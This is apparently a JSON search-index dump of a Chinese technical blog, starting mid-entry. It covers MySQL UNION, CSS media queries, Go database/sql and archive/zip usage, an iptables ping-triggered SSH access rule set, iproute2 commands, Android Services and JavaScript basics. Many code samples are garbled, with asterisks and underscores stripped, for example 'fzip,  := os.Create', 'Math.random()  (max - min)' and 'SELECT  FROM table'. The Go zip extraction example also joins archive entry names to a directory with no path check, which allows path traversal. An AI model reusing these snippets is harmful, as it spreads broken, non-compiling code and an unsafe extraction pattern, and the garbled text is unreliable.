会把结果集中重复的记录删掉，而使用 UNION ALL ，MySQL 会把所有的记录返回，且效率高于 UNION。\n\nmysql  SELECT did FROM employee\n    -  UNION\n    -  SELECT did FROM department;\n+","tags":null},{"location":"//blog.pytool.com/Post/前端技术/CSS/2016-03-29 “Media”让网页更好的支持移动设备","title":"“Media”让网页更好的支持移动设备","text":"CSS2.1规范最重要的新特性之一就是引入了media types,下边是media types的10个值，常用的并不多。当没有media标签时，默认为media=”all”:\nall– 用于所有设备类型\naural– 用于语音和音乐合成器\nbraille– 用于触觉反馈设备\nembossed– 用于凸点字符（盲文）印刷设备\nhandheld– 用于小型或手提设备\nprint– 用于打印机\nprojection– 用于投影图像，如幻灯片\nscreen– 用于计算机显示器\ntty– 用于使用固定间距字符格的设备。如电传打字机和终端\ntv– 用于电视类设备\n示例：\n\n     @media print {\n        body { font-size: 10pt }\n      }\n      @media screen {\n        body { font-size: 13px }\n      }\n      @media screen, print {\n        body { line-height: 1.2 }\n      }\n\n随着移动终端的发展，screen重要性逐渐显现出来。为了更好的支持移动终端设备，\ncss3加强了media types，引入了Media Queries，其作用就是允许使用\n\ncss表达式用以确定媒体的情况，如查询设备的屏幕尺寸颜色等信息，借此让网页更好的适应不同的屏幕。\n示例：\n\n    @media screen and (device-aspect-ratio: 16/9) { … }\n    @media screen and (device-aspect-ratio: 32/18) { … }\n    @media screen and (device-aspect-ratio: 1280/720) { … }\n    @media screen and (device-aspect-ratio: 2560/1440) { … }\n    @media all and (color) { … }\n    @media all and (min-color: 1) { … }\n\n    link rel=\"stylesheet\" media=\"only screen and (-webkit-min-device-pixel-ratio: 2)\" type=\"text/css\" href=\"iphone4.css\" /\n\n    @media screen and (min-width:1280px){\n    \tbody{ ...  }\n    }\n\n    @media screen and (min-width: 800px) and (max-width: 1280px) {\n    \tbody{ ...  }\n    }\n\n    @media screen and (max-width: 800px) {\n    \tbody{ ... }\n    }\n\n应用案例：\n解决icon在不同分辨率屏幕下显示效果问题。解决办法有多种，原理都是采用根据分辨率不同采用不同大小图片的办法。这里用Media Queries可以轻松实现不同屏幕兼容：\n\n    / 普通屏幕 /\n    .icon {\n    \twidth:16px;\n    \theight:16px;\n    \tbackground:url(images/icon.png) no-repeat;\n    }\n\n    / Retina Screen 用大图缩小适配\n       background-size要写在background-image后面,否则部分浏览器会失效\n    /\n    @media only screen and (-webkit-min-device-pixel-ratio:2) {\n     .icon {\n    \t background:url(\"images/icon2.png\") no-repeat;\n    \t -webkit-background-size:16px 16px;\n    \t background-size:16px 16px;\n     }\n    }\n\n-webkit-min-device-pixel-ratio值：\n\nDevices with -webkit-min-device-pixel-ratio: 1.0\nAll non-Retina Macs\nAll non-Retina iOS devices\nAcer Iconia A500\nSamsung Galaxy Tab 10.1\nSamsung Galaxy S\n\nDevices with -webkit-min-device-pixel-ratio: 1.3\nGoogle Nexus 7\n\nDevices with -webkit-min-device-pixel-ratio: 1.5\nGoogle Nexus S\nSamsung Galaxy S II\nHTC Desire\nHTC Desire HD\nHTC Incredible S\nHTC Velocity\nHTC Sensation\n\nDevices with -webkit-min-device-pixel-ratio: 2.0\niPhone 4\niPhone 4S\niPhone 5\niPad (3rd generation)\niPad 4\nAll Macs with Retina displays\nGoogle Galaxy Nexus\nGoogle Nexus 4\nGoogle Nexus 10\nSamsung Galaxy S III\nSamsung Galaxy Note II\nSony Xperia S\nHTC One X\n\nDevices with -webkit-min-device-pixel-ratio: 3.0\nHTC Butterfly\nSony Xperia Z","tags":null},{"location":"//blog.pytool.com/Post/前端技术/2014-04-08-the front-end-automation","title":"前端自动化","text":"---\n\n自动化之前的工作场景\n新建项目A文件夹，再在A文件夹里创建html、css、js、images所需的各个文件夹\n将要用到的css文件(例如：reset.css，bootstrap等)，js文件(例如：Jquery，各种插件等)从以前的项目拷贝到当前项目中\n准备的差不多了，开始切图。写代码，浏览器刷新看效果，改代码，浏览器刷新看效果，再改代码，再刷新。。。。。\n如果在项目中用到 Less 或者 Sass，时不时的还需要将它们编译成css看效果\n需要用到新插件的话，google一下，找到下载，按照文档说明拷贝到对应目录\n切图完成之后。还要压缩css、js、图片，混淆js，单元测试等等。\n\n这些重复性的劳动既耗费时间又没有技术含量。还好，借助一些自动化工具我们就可以跟它们说bye bye 了。\n\n总结上面的开发流程，主要是下面四点：\n开发环境初始化\n样式、脚本的依赖管理\n文件编译、压缩合并、混淆\n自动化测试 等等\n\n解决之道\n通过一些很好用的自动化工具，我们可以将上面的各个部分都自动化，只需敲几个命令就可以走完整个流程，并及时得到运行结果的反馈。\n\n对应的自动化工具：\n开发环境初始化","tags":null},{"location":"//blog.pytool.com/Post/Go/2016-10-04 golang sql","title":"Go语言 sql","text":"---\n\nGolang操作数据库 - 纵酒挥刀斩人头 - 博客园\n基本概念\n\n    Open() – creates a DB\n    Close() - closes the DB\n    Query() - 查询\n    QueryRow() -查询行\n    Exec() -执行操作，update，insert，delete\n    Row - A row is not a hash map, but an abstraction of a cursor\n    Next()\n    Scan()\n\n注意：DB并不是指的一个connection\n连接到数据库\n\n我们以mysql为例，使用github.com/go-sql-driver/mysql，首先我们需要导入我们需要的包\n\nimport (\n    \"database/sql\"\n     \"github.com/go-sql-driver/mysql\"\n)\n\n注意我们导入github.com/go-sql-driver/mysql 前面用了一个\"\",操作其实是引入该包，而不直接使用包里面的函数，而是调用了该包里面的init函数,import的时候其实是执行了该包里面的init函数，初始化了里面的变量，操作只是说该包引入了，我只初始化里面的 init函数和一些变量，但是往往这些init函数里面是注册自己包里面的引擎，让外部可以方便的使用，就很多实现database/sql的包，在 init函数里面都是调用了sql.Register(name string, driver driver.Driver)注册自己，然后外部就可以使用了。\n我们用Open()函数来打开一个database handle\n\ndb, err := sql.Open(\"mysql\", \"user:password@tcp(ip:port)/database\")\n\n写一个完整的：\n\nimport (\n    \"database/sql\"\n     \"github.com/go-sql-driver/mysql\"\n    \"log\"\n)\nfunc main() {\n    db, err := sql.Open(\"mysql\", \"user:password@tcp(ip:port)/database\")\n    if err != nil {\n        log.Println(err)\n    }\n\n    //在这里进行一些数据库操作\n\n    defer db.Close()\n}\n\n我们在执行Open函数的时候，并不会去获得数据库连接有效性，当执行数据库操作的时候才会去连接，当我们需要在Open之后就知道连接的有效性的时候，可以通过Ping()来进行\n\nerr = db.Ping()\nif err != nil {\n    log.Println(err)\n}\n\n我们通常习惯使用Close来关闭数据库连接，但是sql.DB是被设计成长期有效的类型，我们不应该频繁的Open和Close，相反，我们应该建立一个sql.DB，在程序需要进行数据库操作的时候一直使用它，不要在一个方法里面进行Open和Close，应该把sql.DB作为参数传递给方法\n进行数据库操作\n增删改操作\n\nExec()方法一般用于增删改操作，这里以增加为例:\n\nstmt, err := db.Prepare(\"insert into user(name,age)values(?,?)\")\nif err != nil {\n    log.Println(err)\n}\n\nrs, err := stmt.Exec(\"go-test\", 12)\nif err != nil {\n    log.Println(err)\n}\n//我们可以获得插入的id\nid, err := rs.LastInsertId()\n//可以获得影响行数\naffect, err := rs.RowsAffected()\n\n查询操作\n一般的查询\n\n    var name string\n    var age int\n    rows, err := db.Query(\"select name,age from user where id = ? \", 1)\n    if err != nil {\n        fmt.Println(err)\n    }\n    defer rows.Close()\n\n    for rows.Next() {\n        err := rows.Scan(\u0026name, \u0026age)\n        if err != nil {\n            fmt.Println(err)\n        }\n    }\n\n    err = rows.Err()\n    if err != nil {\n        fmt.Println(err)\n    }\n\n    fmt.Println(\"name:\", url, \"age:\", description)\n\n我们应该养成关闭rows的习惯，在任何时候，都不要忘记rows.Close().哪怕这个rows在确实循环完之后，已经自动关闭掉了，我们定义rows.Close()也是对我们没有坏处的，因为我们无法保证，rows是否会正常的循环完。\n查询单条记录，\n\n我们使用db.QueryRow()\n\n    var name string\n    err = db.QueryRow(\"select name from user where id = ?\", 222).Scan(\u0026name)\n\n没有结果的时候会返回err\n处理空值\n\n我们用一个name字段为空的记录来举例\n\nvar name NullString\nerr := db.QueryRow(\"SELECT name FROM names WHERE id = ?\", id).Scan(\u0026name)\n...\nif name.Valid {\n        // use name.String\n} else {\n        // value is NULL\n}\n\n在这种情况下我们通常使用NullString，但是有时候我们并不关心值是不是Null,我们只需要吧他当一个空字符串来对待就行。这时候我们可以使用[]byte（null byte[]可以转化为空string） 或者 sql.RawBytes,\n\nvar col1, col2 []byte\n\nfor rows.Next() {\n    // Scan the value to []byte\n    err = rows.Scan(\u0026col1, \u0026col2)\n\n    if err != nil {\n        panic(err.Error()) // Just for example purpose. You should use proper error handling instead of panic\n    }\n\n    // Use the string value\n    fmt.Println(string(col1), string(col2))\n}\n\n使用sql.RawBytes\n\npackage main\n\nimport (\n    \"database/sql\"\n    \"fmt\"\n     \"github.com/go-sql-driver/mysql\"\n)\n\nfunc main() {\n    // Open database connection\n    db, err := sql.Open(\"mysql\", \"user:password@/dbname\")\n    if err != nil {\n        panic(err.Error())  // Just for example purpose. You should use proper error handling instead of panic\n    }\n    defer db.Close()\n\n    // Execute the query\n    rows, err := db.Query(\"SELECT  FROM table\")\n    if err != nil {\n        panic(err.Error()) // proper error handling instead of panic in your app\n    }\n\n    // Get column names\n    columns, err := rows.Columns()\n    if err != nil {\n        panic(err.Error()) // proper error handling instead of panic in your app\n    }\n\n    // Make a slice for the values\n    values := make([]sql.RawBytes, len(columns))\n\n    // rows.Scan wants '[]interface{}' as an argument, so we must copy the\n    // references into such a slice\n    // See http://code.google.com/p/go-wiki/wiki/InterfaceSlice for details\n    scanArgs := make([]interface{}, len(values))\n    for i := range values {\n        scanArgs[i] = \u0026values[i]\n    }\n\n    // Fetch rows\n    for rows.Next() {\n        // get RawBytes from data\n        err = rows.Scan(scanArgs...)\n        if err != nil {\n            panic(err.Error()) // proper error handling instead of panic in your app\n        }\n\n        // Now do something with the data.\n        // Here we just print each column as a string.\n        var value string\n        for i, col := range values {\n            // Here we can check if the value is nil (NULL value)\n            if col == nil {\n                value = \"NULL\"\n            } else {\n                value = string(col)\n            }\n            fmt.Println(columns[i], \": \", value)\n        }\n        fmt.Println(\"","tags":null},{"location":"//blog.pytool.com/Hacker/00_nettools/iptables的recent模块","title":"Linux命令 iptables","text":"iptables的recent模块\nhttp://www.cnblogs.com/silenceli/p/3416175.html\n\n看到文章中用recent模块控制对主机的访问。\n\n配置方法如下：\n\niptables -A INPUT -p icmp --icmp-type 8 -m length --length 78 -j LOG --log-prefix \"SSHOPEN: \"\n\n#记录日志，前缀SSHOPEN:\n\niptables -A INPUT -p icmp --icmp-type 8 -m length --length 78 -m recent --set --name sshopen --rsource -j ACCEPT\n\n#指定数据包78字节，包含IP头部20字节，ICMP头部8字节。\n\niptables -A INPUT -p tcp --dport 22 --syn -m recent --rcheck --seconds 15 --name sshopen --rsource -j ACCEPT\n\nping -s 50 host #Linux下解锁\n\nping -l 50 host #Windows下解锁\n\n \n\n在配置的过程中我按照这样配置无法ssh到指定主机。\n\n仔细研究了下，需要一个前提即：\n\niptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT\n\n且该条规则需要放在上面第三条之前。\n\n \n\n整理后的配置规则：\n\niptables -F\niptables -X\niptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT\niptables -A INPUT -p icmp --icmp-type 8 -m length --length 78 -j LOG --log-prefix 'SSH\\OPEN\\KEY'\niptables -A INPUT -p icmp --icmp-type 8 -m length --length 78 -m recent --name openssh --set --rsource -j ACCEPT\niptables -A INPUT -p tcp --dport 22 --syn -m state --name openssh --rcheck --seconds 60 --rsource -j ACCEPT\niptables -P INPUT DROP\n在客户侧，如果需要ssh到主机，需要先ping -l 50 ip(windows), ping -s 50 ip (linux)，并在一分钟之内ssh到主机，这样在/proc/net/xt\\recent/目录下生成openssh文件\n    文件内容如下：\n    src=112.1x3.2x7.24 ttl: 53 last\\seen: 42963x6778 oldest\\pkt: 1 4296376778, 4295806644, 4295806895, 4295807146, 4295826619, 4295826870, 4295827122, 4295827372, 4295833120, 4295833369, 4295834525, 4295834777, 4295872016, 4295872267, 4295872519, 4295872769, 4295889154, 4295889406, 4295889658, 4295889910\n\n解释：\n\n1,2清空原有的iptables规则\n\n3，表明已经建立成功的连接和与主机发送出去的包相关的数据包都接受，如果没有这一步，后面的tcp连接无法建立起来\n\n4，出现长度为78字节icmp回响包在/var/log/syslog生成log，log以SSH\\OPEN\\_KEY开头\n\n5，出现长度为78字节icmp回响包，将源地址信息记录在openssh文件中，并接受\n\n6，对于openssh文件中的源地址60s以内发送的ssh连接SYN请求予以接受\n\n7，将INPUT链的默认策略设置为drop\n\n调试过程：没有设置3，则无法建立ssh连接\n\n在没有3的情况下，设置6如果不加--syn，则可以ssh连接一会儿，过一会儿又自动断线，除非ping一下目的地址，原理是：ping目的地址，则会更新openssh的时间，这样ssh连接还在60s之内，所以可以通信，过一会儿，60s超时，则就会断开ssh连接。如果加了--syn，只能进行开始的syn，无法正常连接（具体过程不熟悉，有待进一步学习）。\n\n \n\n给一个参考：\n\nhttp://blog.onovps.com/archives/iptables-recent.html","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 iproute2","title":"Linux命令 route","text":"---\niproute2;高级路由;iproute,iprule; - 陳聽溪 - 博客园\n\nip address （接口地址操作相关）\n\nip -6 address add 2000:ff04::2/64 dev eth1.11       # 接口上添加地址\nip -6 address del 2000:ff04::2/64 dev eth1.11       # 删除接口上指定地址\nip -6 address flush dev eth1.11                     # 删除接口上所有地址\nip -6 address show interface name                 # 查看接口 ipv6 地址\nip address show interface name                    # 查看接口 IP 地址，包括 4/6 2个版本的\nip address add 192.168.1.1 broadcast +              # 设置接口地址和广播地址，+ 表示让系统自动计算\nip address add 192.68.1.1 dev eth1 label eth1.1     # 设置接口别名，注意别和 ip link set ... name 命令混淆\nip address add 192.68.1.1 dev eth1 scope global     # 设置接口领域，也就是可以接受的包的范围，有下面几种：\n                                                    #   global  允许所有\n                                                    #   site    仅允许 ipv6 和本机连接\n                                                    #   link    仅允许本机连接\n                                                    #   host    仅允许内部连接（和 link 的区别还不确定有哪些）\nip route 命令组 （路由表相关）\n\nip -6 route add 2000:ff::/80 via 2000:ff04::1 dev eth1.11   # 添加一条路由\nip -6 route add default via 2000:ff04::1 dev eth1.11        # 添加默认路由\nip -6 route show                                            # 查看完整路由表\nip -6 route show dev eth1.11                                # 查看指定接口路由项\nip -6 route del 2000:ff04::/64                              # 删除所有相关路由表\nip -6 route del 2000:ff04::/64 dev eth1.11                  # 删除相关接口上的路由表\nip -6 route change 2000:ff04::/64 dev eth1.12               # 修改路由表项\nip route add nat 192.168.10.100 via 202.6.10.1              # 添加 NAT 路由项，将 192 地址转换成 202 地址\nip route replace default equalize nexthop via 211.139.218.145 dev eth0 weight 1 nexthop via 211.139.218.145 dev eth1 weight 1   # 添加负载均衡路由\nip neighbor 命令组 （ARP地址表相关）\n\nip neighbor show                                                # 查看 ARP 表\nip neighbor add 10.1.1.1 lladdr 0:0:0:0:0:1 dev eth0 nud permit # 添加一条 ARP 相关表项\nip neighbor change 10.1.1.1 dev eth0 nud reachable              # 修改相关表项\nip neighbor del 10.1.1.1 dev eth0                               # 删除一条表项\nip neighbor flush                                               # 清除整个 ARP 表\nip link set 命令组 （接口硬件操作相关）\n\nip -s -s link show                                  # 显示所有接口详细信息\nip -s -s link show eth1.11                          # 显示单独接口信息\nip link set dev eth1 up                             # 启动设备，相当于 ifconfig eth1 up\nip link set dev eth1 down                           # 停止设备，相当于 ifconfig eth1 down\nip link set dev eth1 txqueuelen 100                 # 改变设备传输队列长度\nip link set dev eth1 mtu 1200                       # 改变 MTU 长度\nip link set dev eth1 address 00:00:00:AA:BB:CC      # 改变 MAC 地址\nip link set dev eth1 name myeth                     # 接口名变更\n\n添加一条网关路由\nroute add -net 192.168.0.0/24 gw 10.0.0.253 dev eth1\n################################################################################\nip addr\n设置和删除 ip地址\nip addr show enp3s0                              查看指定网卡\nip addr flush enp3s0                            # 清空配置\nsudo ip addr add 192.168.0.100/24 dev enp3s0    # 添加ip地址\nsudo ip addr del 192.168.0.193/24 dev enp3s0    # 删除 ip地址\nsudo ip link set enp3s0 up                      # 启动\nsudo ip link set enp3s0 down                    # 停止\n\n路由\nroute\nnetstat -rn\nip route list  显示核心路由表\nip route show\n假设现在你有一个IP地址，你需要知道路由包从哪里来,列出了路由所使用的接口\nip route get 10.42.0.47\n要更改默认路由\nsudo ip route add default via 192.168.0.196 $gateway\n配置一条路由: 发到 10.0.0.0/24 的数据包通过 192.168.0.19 (gw)转发\nip route add 10.0.0.0/24 via 192.168.0.19\nARP\nip neighbour\nip neigh list  显示邻居表\n监控netlink消息\nsudo ip monitor all\n\n 重启网卡\nsudo service network-manager restart\n\n/etc/init.d/network restart\nifdown eth0\n  ifup eth0\nifconfig eth0 down\n  ifconfig eth0 up\n\n#","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/archive_zip","title":"golang中archive/zip包用法","text":"chenbaoke的专栏\ngolang中archive/zip包用法\n\narchive/zip包提供了zip归档文件的读写操作。\n\n在对zip包进行介绍之前，先说明一下zip和tar的区别。\n\n二者都是对文件进行归档，不进行压缩。并且二者使用平台不同，对于 Windows 平台而言，最常用的格式是 zip 和 rar，国内大多数是用 rar，国外大多数是用 zip。而对于类 Unix 平台而言，常用的格式是 tar 和 tar.gz，zip 比较少一些，rar 则几乎没有。\n\nzip 格式是开放且免费的，所以广泛使用在 Windows、Linux、MacOS 平台，要说 zip 有什么缺点的话，就是它的压缩率并不是很高，不如 rar及 tar.gz 等格式。\n\n严格的说，tar 只是一种打包格式，并不对文件进行压缩，主要是为了便于文件的管理，所以打包后的文档大小一般远远大于 zip 和 tar.gz，但这种格式也有很明显的优点，例如打包速度非常快，打包时 CPU 占用率也很低，因为不需要压缩嘛。\n\n接下来对zip包进行讲解。\n\nzip包不支持跨硬盘进行操作为了向下兼容，FileHeader同时拥有32位和64位的Size字段。64位字段总是包含正确的值，对普通格式的档案未见它们的值是相同的。对zip64格式的档案文件32位字段将是0xffffffff，必须使用64位字段。\nConstants\n\n压缩算法\n\nconst (\n        Store   uint16 = 0\n        Deflate uint16 = 8\n)\n\nVariables\n\n错误变量\n\nvar (\n    ErrFormat    = errors.New(\"zip: not a valid zip file\")\n    ErrAlgorithm = errors.New(\"zip: unsupported compression algorithm\")\n    ErrChecksum  = errors.New(\"zip: checksum error\")funcname\n)\n\nfunc RegisterCompressor(method uint16, comp Compressor) //使用指定的方法id生成一个Compressor的类型函数。常用的方法Store和Deflate是内建的\nfunc RegisterDecompressor(method uint16, d Decompressor)//使用指定的方法id注册一个Decompressor类型的函数\n\ntype Compressor\n\n    type Compressor func(io.Writer) (io.WriteCloser, error)\n\nCompressor函数类型会返回一个io.WriteCloser，该接口会将数据压缩后写入提供的接口。关闭时，应将缓存中的数据写入下层接口中。\n\ntype Decompressor\n\n    type Decompressor func(io.Reader) io.ReadCloser\n\nDecompressor函数类型会把一个io.Reader包装成具有decompressing特性的io.Reader.Decompressor函数类型会返回一个io.ReadCloser，该接口的Read方法会将读取自提供的接口的数据提前解压缩。需要在读取结束时关闭该io.ReadCloser。\n\ntype File\n\ntype File struct {\n    FileHeader\n    // contains filtered or unexported fields\n}\n\n    func (f  File) DataOffset() (offset int64, err error) //DataOffset返回文件的可能存在的压缩数据相对于zip文件起始的偏移量。大多数调用者应使用Open代替，该方法会主动解压缩数据并验证校验和。\n\nfunc (f \\File) Open() (rc io.ReadCloser, err error) //Open方法返回一个io.ReadCloser接口，提供读取文件内容的方法。可以同时读取多个文件。\n\ntype FileHeader\n\ntype FileHeader struct {\n    Name string    // Name是文件名，它必须是相对路径， 不能以设备或斜杠开始，只接受'/'作为路径分隔符\n\n    CreatorVersion     uint16\n    ReaderVersion      uint16\n    Flags              uint16\n    Method             uint16\n    ModifiedTime       uint16 // MS-DOS time\n    ModifiedDate       uint16 // MS-DOS date\n    CRC32              uint32\n    CompressedSize     uint32 // deprecated; use CompressedSize64\n    UncompressedSize   uint32 // deprecated; use UncompressedSize64\n    CompressedSize64   uint64\n    UncompressedSize64 uint64\n    Extra              []byte\n    ExternalAttrs      uint32 // Meaning depends on CreatorVersion\n    Comment            string\n}\n\nfunc FileInfoHeader(fi os.FileInfo) (\\FileHeader, error)//FileInfoHeader返回一个根据fi填写了部分字段的Header。因为os.FileInfo接口的Name方法只返回它描述的文件的无路径名，有可能需要将返回值的Name字段修改为文件的完整路径名。\nfunc (h \\FileHeader) FileInfo() os.FileInfo //FileInfo返回一个根据h的信息生成的os.FileInfo。\nfunc (h \\FileHeader) ModTime() time.Time  //获取最后一次修改时间\nfunc (h \\FileHeader) Mode() (mode os.FileMode)  //Mode返回h的权限和模式位。\nfunc (h \\FileHeader) SetModTime(t time.Time)  //设置更改时间\nfunc (h \\FileHeader) SetMode(mode os.FileMode) //设置mode\n\n举例说明其用法\n\npackage main\n\nimport (\n    \"archive/zip\"\n    \"fmt\"\n    \"os\"\n    \"time\"\n)\n\nfunc main() {\n    fileinfo, err := os.Stat(\"../1.txt\")\n    if err != nil {\n        fmt.Println(err)\n    }\n    fileheader, err := zip.FileInfoHeader(fileinfo)\n    if err != nil {\n        fmt.Println(err)\n    }\n    fmt.Println(fileheader.ModTime()) //2015-09-22 15:55:02 +0000 UTC\n    fileheader.SetModTime(time.Now().AddDate(1, 1, 1))\n    fmt.Println(fileheader.ModTime()) //2016-12-11 06:57:48 +0000 UTC\n}\n\ntype ReadCloser\n\ntype ReadCloser struct {\n    Reader\n    // contains filtered or unexported fields\n}\n\nfunc OpenReader(name string) (\\ReadCloser, error) //打开指定名为name的zip类型的文件，返回一个ReadCloser\nfunc (rc \\ReadCloser) Close() error //关闭ReadCloser\ntype Reader\n\ntype Reader struct {\n    File    []File\n    Comment string\n    // contains filtered or unexported fields\n}\n\nfunc NewReader(r io.ReaderAt, size int64) (\\Reader, error) //NewReader返回一个从r读取数据的\\Reader，r被假设其大小为size字节。\n\ntype Writer  //实现zip文件的写入\n\ntype Writer struct {\n            cw     countWriter\n            dir    []header\n            last   fileWriter\n            closed bool\n        }\n\nfunc NewWriter(w io.Writer) \\Writer  //NewWriter创建并返回一个将zip文件写入w的\\Writer\nfunc (w \\Writer) Close() error   //关闭writer w\nfunc (w \\Writer) Create(name string) (io.Writer, error)  //使用给出的文件名添加一个文件进zip文件。本方法返回一个io.Writer接口（用于写入新添加文件的内容）。文件名必须是相对路径，不能以设备或斜杠开始，只接受'/'作为路径分隔。新增文件的内容必须在下一次调用CreateHeader、Create或Close方法之前全部写入。\nfunc (w \\Writer) CreateHeader(fh \\FileHeader) (io.Writer, error) //使用给出的\\FileHeader来作为文件的元数据添加一个文件进zip文件。本方法返回一个io.Writer接口（用于写入新添加文件的内容）。新增文件的内容必须在下一次调用CreateHeader、Create或Close方法之前全部写入。\nfunc (w \\Writer) Flush() error  //将缓存中数据写入底层io，通常情况下调用flush是没有必要的，调用close是必要的。\nfunc (w \\*Writer) SetOffset(n int64)  //该函数用来设置将zip数据写入底层writer中的开始偏移量，其经常用于将zip文件追加到一个文件的后面，比如将一个数据写入一个二进制数据之后，该函数必须在数据写入之前进行调用。\n\n举例说明zip的reader和writer用法。\n\npackage main\n\nimport (\n    \"archive/zip\"\n    \"fmt\"\n    \"io\"\n    \"io/ioutil\"\n    \"os\"\n    \"time\"\n)\n\nfunc main() {\n    CompressZip()   //压缩\n    DeCompressZip() //解压缩\n}\n\nfunc CompressZip() {\n    const dir = \"../img-50/\"\n    //获取源文件列表\n    f, err := ioutil.ReadDir(dir)\n    if err != nil {\n        fmt.Println(err)\n    }\n    fzip,  := os.Create(\"img-50.zip\")\n    w := zip.NewWriter(fzip)\n    defer w.Close()\n    for , file := range f {\n        fw,  := w.Create(file.Name())\n        filecontent, err := ioutil.ReadFile(dir + file.Name())\n        if err != nil {\n            fmt.Println(err)\n        }\n        n, err := fw.Write(filecontent)\n        if err != nil {\n            fmt.Println(err)\n        }\n        fmt.Println(n)\n    }\n}\n\nfunc DeCompressZip() {\n    const File = \"img-50.zip\"\n    const dir = \"img/\"\n    os.Mkdir(dir, 0777) //创建一个目录\n\n    cf, err := zip.OpenReader(File) //读取zip文件\n    if err != nil {\n        fmt.Println(err)\n    }\n    defer cf.Close()\n    for _, file := range cf.File {\n        rc, err := file.Open()\n        if err != nil {\n            fmt.Println(err)\n        }\n\n        f, err := os.Create(dir + file.Name)\n        if err != nil {\n            fmt.Println(err)\n        }\n        defer f.Close()\n        n, err := io.Copy(f, rc)\n        if err != nil {\n            fmt.Println(err)\n        }\n        fmt.Println(n)\n    }\n\n}\n\n参考：https://golang.org/pkg/archive/zip/","tags":null},{"location":"//blog.pytool.com/Post/Android 应用/2016-01-13 Android应用 四大组件Service","title":"四大组件之 Service","text":"Service,四大组件之一,是一个可以在后台执行长时间运行操作而不使用用户界面的应用组件。服务可由其他应用组件启动，而且即使用户切换到其他应用，服务仍将在后台继续运行。 此外，组件可以绑定到服务，以与之进行交互，甚至是执行进程间通信 (IPC)。 例如，服务可以处理网络事务、播放音乐，执行文件 I/O 或与内容提供程序交互，而所有这一切均可在后台进行。\n\n但是必须要提的是,虽然说是后台,但是Service运行在主线程!\nPS:Service的官方文档有中文翻译了!!真是个大好的消息!\n\n跟Activity类似,service也有自己的生命周期,但是简单了一些.\nservicelifecycle\nService的基本使用\n\n上面的生命周期已经提示到了,使用Service有两种方式,启动/停止,绑定/解绑,一一对应:\n\n    startService stopService(启动)\n    bindService unbindService(绑定)\n    还有一种就是即调用start,又调用bind(又启动又绑定)\n\n这几个方式都有什么区别呢?\n不急,咱慢慢来,一一解答.\n\n!-- more --\n\n咱先写个MyService,继承service,重写他的各种方法,并加入打印日志(这是我学习最常用的办法).\n写几个按钮调用不同方法,再加个ServiceConnection,代码就不给全了,没难度,不过要注意Service要在xml里配置\n","tags":null},{"location":"//blog.pytool.com/Post/2015-11-17-javascript-better-practice","title":"javascript better practice","text":"null\n把 null 理解为对象的占位符。\n\n可以使用 null 的场景：\n\n用来初始化变量，该变量可能赋值为一个对象\n用来和一个已经初始化的变量比较，这个变量可以是也可以不是一个对象？？？？？\n当函数的参数值期望的是对象时，用作参数传入\n当函数的返回值期望是对象时，用作返回值传出\n\n不应该使用 null 的场景：\n\n不要使用 null 来检测是否传入了某个参数\n不要用 null 来检测一个未初始化的变量\n\n要避免\"空比较\"，因为仅仅和 null 比较并不能提供足够的信息来判断后续代码的执行是否真的安全。\n undefined\n\n没有被初始化的变量都有一个初始值，即 undefined，表示该变量等待被赋值。\n\n要避免在代码中使用 undefined。\n\n注意：\n\nnull == undefined 为 true\n不管是未初始化的变量，还是未声明的变量，typeof 的运算结果都是 \"undefined\"\n\n字符串\n\n 切割字符串\n\n按长度切割：\n\n\t\tstr.substr(start[, length])\n\n按位置切割：\n\n\t\tstr.slice(beginSlice[, endSlice])\n\t\tstr.substring(indexStart[, indexEnd])\n\n\tslice 和 substring 的区别\n\n    上面三个方法，如果省略第二个参数，默认都是切割到字符串末尾\n\n匹配字符串\n\n查找子字符串：\n\n\t\tstr.indexOf(searchValue[, fromIndex])\n\t\tstr.lastIndexOf(searchValue[, fromIndex])\n\n\t如果没找到返回 -1\n\n按正则匹配：\n\n\t只想知道是否匹配：regexObj.test(str)\n\t想知道是否匹配，同时要获取位置：str.search(regexp)\n\t更多信息：str.match(regexp)\n\n 数字\n\n取整\n\n向上取整：Math.ceil()\n向下取整：Math.floor()\n四舍五入：Math.round()\n\n 获取随机数\n\nMath.random() 返回 [0, 1) 的伪随机数\n\n// 返回指定范围的随机数，包含最小值 min，不包含最大值 max\nfunction getRandomArbitrary(min, max) {\n  return Math.random()  (max - min) + min;\n}\n\n// 返回指定范围的随机整数，包含最小值 min，不包含最大值 max\n// Using Math.round() will give you a non-uniform distribution!\nfunction getRandomInt(min, max) {\n  return Math.floor(Math.random()  (max - min)) + min;\n}\n\n数组\n\n新建数组\n\n\t\tvar color=[\"red\",\"green\",\"blue\"]\n\n拼接为字符串\n\n\t\tarr.toString() // 逗号分割\n\t\tarr.join([separator = ',']) // 指定分隔符\n\n迭代数组\n\n\tECMAScript 5为数组定义了五个迭代方法。每个方法都接收两个参数：要在每一项上运行的函数和运行该函数的作用域对象（可选）。第二个参数会影响this的值。第一个参数：函数，接受三个参数：数组项的值，该项在数组中的位置和数组对象本身。\n\n\t过滤数组\n\n\t\t\tfilter() // 返回该函数会返回true的项组成的数组\n\n\t判断数组\n\n\t\t\tevery() // 如果该函数对每一项都返回true,则返回true\n\t\t\tsome() // 如果该函数对任一项返回true,则返回true\n\n\t操作数组项\n\n\t\t\tforEach() // 没有返回值\n\n\t映射数组\n\n\t\t\tmap() // 返回每次函数调用的结果组成的数组\n\n在数组中查找项\n\n\t\tarr.indexOf(searchElement[, fromIndex = 0])\n\t\tarr.lastIndexOf(searchElement[, fromIndex = arr.length - 1])\n\n增加、删除项\n\n\t\tshift() // 方法移除数组中的第一项，并返回移除的项。\n\t\tunshift() // 在数组前端添加任意个项，并返回新数组的长度。\n\t\tpop() // 从数组末尾移除最后一项，返回移除的项。\n\t\tpush() // 在数组尾部添加任意个项，并返回修改后的数组长度。\n\n数组排序\n\n\t\treverse() // 方法会反转数组项的排序\n\t\tsort() // 默认是用比较字符串的方式按升序排列，也可以自定义排序函数。\n\n拼接数组\n\n\t\tvar newarray = oldarray.concat(value1[, value2[, ...[, valueN]]])\n\n切割数组\n\n\t\tarr.slice([begin[, end]]) // 返回起始位置和结束位置之间的项（不包括结束位置）。\n\n 对象\n\n新建对象\n\n\t\tvar book={ title:\"javascript\", author: \"zakas\"}\n\nDate\n时间戳是自1970 年1 月1 日（00:00:00 GMT）以来的秒数。它也被称为Unix 时间戳（Unix Timestamp）。\n\n新建日期对象\n\n\t\tnew Date()\n\t\tnew 